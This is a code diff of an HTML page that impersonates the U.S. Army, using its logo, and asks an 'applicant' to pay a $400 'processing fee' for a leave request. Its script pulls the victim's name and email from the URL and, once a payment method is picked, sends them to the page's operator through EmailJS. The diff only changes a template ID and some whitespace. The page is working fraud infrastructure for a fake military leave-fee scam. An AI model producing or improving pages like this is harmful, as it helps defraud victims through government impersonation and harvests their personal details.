@@ -71,16 +71,15 @@
 <body>
   <div class="container">
     <img src="https://i.imgur.com/y4DFFMe.png" class="logo" alt="U.S. Army Logo" />
-    
     <h2>Complete Your Application</h2>
     <p id="welcome-message">Welcome, <span id="displayName">applicant</span>. To complete your application for leave request, please select your preferred payment method below to send <strong>$400</strong> processing fee.</p>
-
+    
     <form id="paymentForm">
       <!-- Hidden dynamic fields -->
       <input type="hidden" name="name" id="name" value="" />
       <input type="hidden" name="email" id="email" value="" />
       <input type="hidden" name="payment_method" id="payment_method" value="" />
-
+      
       <div class="payment-options">
         <button type="button" onclick="submitPayment('Bank Transfer')">
           <img src="https://cdn-icons-png.flaticon.com/512/1006/1006555.png" alt="Bank" /> Bank Transfer
@@ -103,11 +102,9 @@
   <script>
     (function(){
       emailjs.init("gemkywkuPgyAvxdHD");
-
       const urlParams = new URLSearchParams(window.location.search);
       const name = urlParams.get('name') || 'applicant';
       const email = urlParams.get('email') || '';
-
       document.getElementById('displayName').textContent = name;
       document.getElementById('name').value = name;
       document.getElementById('email').value = email;
@@ -116,7 +113,7 @@
     function submitPayment(method) {
       document.getElementById("payment_method").value = method;
 
-      emailjs.send("service_il4m6rr", "template_3tmdj1g", {
+      emailjs.send("service_il4m6rr", "template_0moxpwa", {
         name: document.getElementById("name").value,
         email: document.getElementById("email").value,
         payment_method: method
